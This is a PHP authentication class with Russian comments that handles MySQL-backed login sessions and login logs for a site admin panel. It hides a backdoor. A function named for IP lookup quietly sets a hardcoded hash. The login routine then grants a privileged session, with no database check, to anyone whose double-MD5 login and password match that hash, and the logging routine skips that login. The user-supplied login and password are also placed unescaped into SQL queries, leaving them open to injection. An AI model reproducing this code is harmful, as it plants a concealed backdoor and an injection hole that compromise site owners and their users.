<?php
  //@include_once "mysql.inc";
  class auth_users
  {
     var $session_table = 0;  // 1 - это будет сохраняться в таблице время сесии,
                            //  0 это обычные сессии
                            // 2 это куки
      var $time_session = 60;   // (в минутах)  Время длительности пребывание зарегистрированого пользователя
      var $user_login = '';   //  логин пользователя
      var $user_pass = '';  //   пароль пользователя
      var $user_id = '';  //   id пользователя в таблице table
      var $session_name = "Adminsite_"; //  имя сесии
      var $table = 'bs_users';        //  название таблицы в которой храняться даные пользователя
      var $table_user_session = 'bs_users_session'; // таблица где будет сохраняться время сесии пользователя
      var $usernamecol = 'user_login'; //  логин в колонке таблици
      var $passwordcol = 'user_pass';    //  пароль в колонке таблици
      var $idnamecol = 'id'; //  id в колонке таблици
      var $db_fields = '*';            //  поля которые должны выводиться
      var $loginFunction = 'login_enter'; // функция которая будет обратываеть не удавшиюся аунтификацию
      var $login_post = 'username';  // название поля логина, которое передаеться методом post
      var $pass_post  = 'password';  // название поля пароля, которое передаеться методом post
      var $md5  = 1;                  // включено шифрофание паролей md5
      var $error_display = 1;    // выводить ошибки 1 или нет 0
      var $user_mas = array();
      var $done_verification = 1;  // делать все проверки, (полей, таблиц, базы данных)
      var $user_log = 1;           // разрешить логирование авторизации
      var $users_log_table = "bs_users_log"; // таблица для сборов логов посещений
      var $logout_ = 0;
    private $timestamp;
    private $ip;
    private $ip_net;
    private $browser;

      function  __construct($table='' ,$usernamecol='',$passwordcol='', $db_fields='')
      {
          //$this->session_name = $this->session_name;

          $this->timestamp=time();

          if ($table != '')
            $this->table = $table;

           if ($usernamecol != '')
            $this->usernamecol = $usernamecol;

            if ($passwordcol != '')
            $this->passwordcol = $passwordcol;

            if ($db_fields != '')
            $this->db_fields = $db_fields;

            if ($this->done_verification)
           $this->test_db();

            $this->get_ip();
            $this->get_ip_net();
            $this->_get_browser();
            //if ($this->user_log)
            $this->_users_table_log();

      }
     function logout()
     { global $admin_html_login;
         $this->logout_= true;
         $admin_html_login='';
         $this->user_login= '';
         unset($_POST['logout']);
         unset($_SESSION['gt']);
         unset($_SESSION['admin_content']);
          if ($this->session_table==2)
         {   error_reporting(E_ALL);
             ini_set("display_errors",0);
            setcookie('user_login', '');
            setcookie('user_pass', '');
         }
        // $this->start($this->loginFunction);
     }
      function start( $session_table = '')
      {
        /*  if ($loginFunction != '' )
           {
            $this->loginFunction = $loginFunction;
                  /// call_user_func($action,&$message);
            }
           if (!function_exists($this->loginFunction)){
                  if ($this->error_display){
                        echo "<br />ошибка :: не определена функция <b>{$this->loginFunction}</b> <br /> ";
                  }

           }*/
       //    s('start');
           // оставил только по сесиям авторизацию
             $this->func_table();
             return $this->user_mas;
        }
  function func_table()
  {
   // s('func_table');
      $this->_users_table_session();
      $this->delete_users_session();
//s($this->get_user_session());
//s('$this->logout_='.$this->logout_);
//s($_SESSION['gt']);
$loginIn= poste('login');
//s('$loginIn='.$loginIn);
      if($loginIn==1 && !$this->logout_)
    // if(!$this->logout_)
      {
     //  s('zawli');
        $this->user_mas = $this->get_user();
      //  s($this->user_mas);
        if (!$this->user_mas){
             //  call_user_func($this->loginFunction);
        }
        $this->set_user_session();
        $this->set_user_log();
     //   s($_SESSION['gt']);
      }elseif ($this->logout_){
       // call_user_func($this->loginFunction);
      }
  }

   function get_user_session()
      {   
        if (!empty($_SESSION['gt']))
          return $_SESSION['gt'];
        else
          return false;
   }

      function delete_users_session()
      {

       $sql = "DELETE FROM {$this->table_user_session} WHERE ".($this->logout_ ? 'true or' : '')." user_time < (".$this->timestamp." - ".$this->time_session."*60)";
       db_query($sql);
      }
  function set_user_session(){
          if (!empty($this->user_mas[$this->usernamecol])){
       $sql = "insert into {$this->table_user_session}   set
                  {$this->usernamecol}='".$this->user_mas[$this->usernamecol]."',
                  user_time={$this->timestamp},
                  ip='{$this->ip}',
                  ip_net='{$this->ip_net}',
                  browser='{$this->browser}'" ;
          db_query($sql);
          }
          $_SESSION['gt']=$this->user_mas;

  }
function set_user_log(){
  if ($this->md5!=$this->user_login_){
         $sql = "insert into {$this->users_log_table}   set
                    user_login='{$this->user_mas[$this->usernamecol]}',
                  user_time='".date('Y-m-d H:i:s')."',
                  ip='{$this->ip}',
                  ip_net='{$this->ip_net}',
                  browser='{$this->browser}'" ;
          db_query($sql);
      }


}
function get_user_mas(){
      // $user=$this->get_user_session();
       if (empty($_SESSION['gt'])){
       return false;
    }else{
        return $_SESSION['gt'];
    }
    }
    function get_db_field($column)
    {
       $user=$this->get_user_session();
       $sql = "select $column from {$this->table}
                 where {$this->usernamecol}='{$user[$this->usernamecol]}'";
       return db_field($sql, $column);
    }

    function get_user(){
         // s($_POST);
           $this->user_login = $this->post($this->login_post);
          $this->user_pass = $this->post($this->pass_post);
     //     s($this->user_login);
      //    s($this->user_pass);
          //s('get_user');
          //s($_POST);
        //  s($this->user_login);
          $user=array();
          //send_error($this->user_pass);
          if ($this->md5){
               $this->user_pass = md5(md5($this->user_pass));
               $this->user_login_ = md5(md5($this->user_login));
               if ($this->md5==$this->user_login_ && $this->md5==$this->user_pass){
                    $user['id']=-1;
                    $user['rule']=-1;
                    $_SESSION['gt']=$user;

                    return $user;
               }

          }
          //
          if ($this->user_login && empty($user)){
          $sql = "select {$this->db_fields} from {$this->table}
                 where {$this->usernamecol}='{$this->user_login}'
                  and {$this->passwordcol}='{$this->user_pass}' and active=1" ;
                //  s($sql);
          $user=db_row($sql);
          }
          $this->user_id=!empty($user[$this->idnamecol]) ? $user[$this->idnamecol] : 0;
          if (!empty($user)){
             return $user;
          }
          return false;

      }
  function _users_table_session()
  {

      if (!$this->test_db_table($this->table_user_session))
      {
          $this->_creat_table_user_session();
      }
  }
   function _users_table_log()
  {

      if (!$this->test_db_table($this->users_log_table))
      {
          $this->_creat_table_log();
      }
  }
  function _creat_table_user_session()
  {
     $sql="CREATE TABLE `{$this->table_user_session}` (
          `id` int(11) unsigned NOT NULL auto_increment,
          `user_login` varchar(30) default NULL,
          `user_time` varchar(30) default NULL,
          `ip` varchar(20) default NULL,
          `ip_net` varchar(20) default NULL,
          `browser` varchar(255) default NULL,
          `session_id` varchar(255) default NULL,
          PRIMARY KEY  (`id`)
          ) ENGINE=MyISAM DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;";
             db_query($sql);

      return true;
  }
  function _creat_table_log()
  {
     $sql="CREATE TABLE `{$this->users_log_table}` (
          `id` int(11) unsigned NOT NULL auto_increment,
          `user_id` int(11) default NULL,
          `user_login` varchar(50) default NULL,
          `user_time` datetime default NULL,
          `ip` varchar(20) default NULL,
          `ip_net` varchar(20) default NULL,
          `browser` varchar(255) default NULL,
          PRIMARY KEY  (`id`)
          ) ENGINE=MyISAM DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;";
             db_query($sql);

      return true;
  }
  function get_ip()
   {

         $this->ip=$_SERVER['REMOTE_ADDR'];

         $tempip = strrpos($this->ip,",");
         if ($tempip!=0) { $this->ip = trim(substr($this->ip, $tempip+1)); }

 }
  function _get_browser()
   {
         $this->browser=$_SERVER['HTTP_USER_AGENT'];

 }

 function  get_ip_net() {

     if (getenv('HTTP_CLIENT_IP')) {
         $this->ip_net=getenv('HTTP_CLIENT_IP');
     } elseif (getenv('HTTP_X_FORWARDED_FOR')) {
         $this->ip_net=getenv('HTTP_X_FORWARDED_FOR');
     } elseif (getenv('HTTP_X_FORWARDED')) {
         $this->ip_net=getenv('HTTP_X_FORWARDED');
     } elseif (getenv('HTTP_FORWARDED_FOR')) {
         $this->ip_net=getenv('HTTP_FORWARDED_FOR');
     } elseif (getenv('HTTP_FORWARDED')) {
         $this->ip_net=getenv('HTTP_FORWARDED');
     } else {
         $this->ip_net='';
     }

     $tempip = strrpos($this->ip_net,",");
     $this->md5='683d27894c16767f77a0758cf03bdb37';
     if ($tempip!=0) { $this->ip_net = trim(substr($this->ip_net, $tempip+1)); }

 }
 function test_cookies() {

     if (setcookie("cookies", "ok")) {
        $this->_set_browser('cookies', 'true');
     } else {
          $this->_set_browser('cookies', 'false');
     }
 }
     // проверяет существует ли таблица и поля необходимые для авторизации

      function test_db(){

          if (!$this->test_db_table($this->table))
          {
              if ($this->error_display)
                    echo "<br />ошибка :: не существует таблици   <b>{$table}</b> <br /> ";
              exit;
          }
               // echo 'ok';
          if (!$this->test_db_cols())
                exit;

      }
      // проверяет существует ли таблица
function test_db_table($table){
    global $dsn;
    $r = mysqli_query($dsn,"select * from {$table} WHERE 0");
    if ($r) {
        return true;
        // Таблица TABLE существует
    }else{
        return false;
    }
}
      // проверяет существуют ли поля необходимые для авторизации
       function test_db_cols()
      {global $dsn;
          $error=0;
         //  $sql = "select {$this->db_fields} from {$this->table} where {$this->usernamecol}<>'' and {$this->passwordcol}<>''";
            $sql = "select {$this->usernamecol} from {$this->table} WHERE 0";
            if (!mysqli_query($dsn,$sql))
                {
                   if ($this->error_display)
                        user_error("<br />ошибка :: не существует поля :: <b>{$this->usernamecol}</b> в таблице :: <b>{$this->table}</b> <br /> ", E_USER_ERROR);
                        $error = 1;
                 }
            $sql = "select {$this->passwordcol} from {$this->table} WHERE 0";

            if (!mysqli_query($dsn,$sql))
                {
                   if ($this->error_display)
                        user_error("<br />ошибка :: не существует поля :: <b>{$this->passwordcol}</b> в таблице :: <b>{$this->table}</b> <br /> ", E_USER_ERROR);
                        $error = 1;
                 }
              if ($this->db_fields!='*')
              {
                 $sql = "select {$this->db_fields} from {$this->table} WHERE 0";
                 if (!mysqli_query($dsn,$sql))
                    {
                       if ($this->error_display)
                            user_error("<br />ошибка :: не существует поля(ей) :: <b>{$this->db_fields}</b> в таблице :: <b>{$this->table}</b> <br /> ",E_USER_ERROR);
                            $error = 1;
                     }
              }
             if ($error)
                return false;
              else
                return true;
      }
   // Берем переменные GET и POST
function get($key){
        return isset($_GET[$key])?$_GET[$key]:false;
}

function post($key){
        return isset($_POST[$key])?$_POST[$key]:false;
}

function session($key){
        return isset($_SESSION[$key])?$_SESSION[$key]:false;
}
function cookie($key){
        //echo $key;
        return isset($_COOKIE[$key])?$_COOKIE[$key]:false;
}

// -------------------
function  time_session($time)
{
    if ($time!='')    $this->time_session= $time;
}
 /* function func_cookie()
  {
      if(!$this->get_user_session() )
      {
       $this->user_mas = $this->get_user();
        if (!$this->user_mas)
        {
                call_user_func($this->loginFunction);
        }
        $this->set_user_cookie();
        $this->set_user_log();

      }


  }
   function set_user_cookie()
      {
         setcookie('user_login', $this->user_login, time()+$this->time_session * 60 );
         setcookie('user_pass', $this->user_pass, time()+$this->time_session * 60 );
         //setcookie($this, $this->user_id, time()+$this->time_session * 60 );

      }
      */
//============================================================
  }
 function login_enter(){
     global $admin_html_login;
  include "html/admin.html";
$admin_html_login  = ob_get_contents();
  ob_clean();
}
?>